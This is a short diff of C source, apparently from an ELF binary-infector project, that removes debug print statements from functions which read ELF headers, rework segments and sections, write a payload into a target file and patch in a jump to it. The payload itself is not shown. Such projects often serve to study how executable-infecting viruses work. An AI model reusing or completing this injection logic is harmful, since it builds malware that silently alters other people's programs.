@@ -6,8 +6,6 @@ int FORCE_INLINE metamorph_segment(t_data data)
 	Elf64_Ehdr	e_hdr;
 	int		len;
 
-	ft_putchar('5');
-	ft_putchar('\n');
 	LSEEK(data.fd, 0, SEEK_SET);
 	READ(data.fd, &e_hdr, sizeof(e_hdr));
 	len = e_hdr.e_phnum;
@@ -37,8 +35,6 @@ int FORCE_INLINE metamorph_section(t_data data)
 	Elf64_Ehdr	e_hdr;
 	int		len;
 
-	ft_putchar('4');
-	ft_putchar('\n');
 	LSEEK(data.fd, 0, SEEK_SET);
 	READ(data.fd, &e_hdr, sizeof(e_hdr));
 	len = e_hdr.e_shnum;
@@ -82,8 +78,6 @@ int inject(t_data data)
 	u64 offset;
 	u64 payload_addr;
 
-	ft_putchar('3');
-	ft_putchar('\n');
 	data.bin = get_infos(data.fd);
 	if (!metamorph_segment(data))
 		return (0);
@@ -100,7 +94,5 @@ int inject(t_data data)
 	WRITE(data.fd, payload_addr, data.infos.pl_size);
 	write_jump(data);
 	CLOSE(data.fd);
-	ft_putchar('6');
-	ft_putchar('\n');
 	return (1);
 }
